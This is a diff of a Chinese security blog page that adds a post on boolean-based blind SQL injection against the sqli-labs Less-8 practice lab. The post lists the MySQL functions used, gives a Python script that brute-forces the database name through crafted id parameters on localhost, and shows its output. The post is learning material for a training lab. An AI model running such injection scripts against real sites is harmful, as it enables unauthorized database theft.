@@ -64,7 +64,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">276字</span>
+            <span class="post-count">448字</span>
         </span>
     </span>
 
@@ -73,7 +73,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1分钟</span>
+            <span class="post-count">2分钟</span>
         </span>
     </span>
 </div>
@@ -120,11 +120,14 @@
 
 
 
+<p>{0}代表数据库的第几位<br>{1}代表acsii码的数值</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br></pre></td></tr></table></figure>
 
 
 
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_name</span><span class="params">()</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    url_template = <span class="string">"http://127.0.0.1:8080/Less-8/?id=1' and ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125; %23"</span></span><br><span class="line">    chars = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = ord(char)</span><br><span class="line">            url = url_template.format(i,char_ascii) <span class="comment">#分别对应url的&#123;0&#125;、&#123;1&#125;</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            length = len(response.text) </span><br><span class="line">            <span class="comment">#返回的长度只有706和722</span></span><br><span class="line">            <span class="keyword">if</span> length&gt;<span class="number">706</span>:</span><br><span class="line">                result += char</span><br><span class="line">                print(length,char,char_ascii)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br><span class="line">get_db_name()</span><br></pre></td></tr></table></figure>
 
-
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">722</span> s <span class="number">115</span></span><br><span class="line"><span class="number">722</span> e <span class="number">101</span></span><br><span class="line"><span class="number">722</span> c <span class="number">99</span></span><br><span class="line"><span class="number">722</span> u <span class="number">117</span></span><br><span class="line"><span class="number">722</span> r <span class="number">114</span></span><br><span class="line"><span class="number">722</span> i <span class="number">105</span></span><br><span class="line"><span class="number">722</span> t <span class="number">116</span></span><br><span class="line"><span class="number">722</span> y <span class="number">121</span></span><br><span class="line">security</span><br></pre></td></tr></table></figure>
 
 
 
@@ -215,10 +218,19 @@
   
   <nav class="article-nav">
     
+      <a href="/2020/06/11/php/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer posts</strong>
+        <div class="article-nav-title">
+          
+            php
+          
+        </div>
+      </a>
     
-      <a href="/2020/04/23/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/" class="article-nav-link">
+    
+      <a href="/2020/04/26/Forensics/" class="article-nav-link">
         <strong class="article-nav-caption">Older posts</strong>
-        <div class="article-nav-title">渗透实战学习</div>
+        <div class="article-nav-title">Computer Forensics</div>
       </a>
     
   </nav>
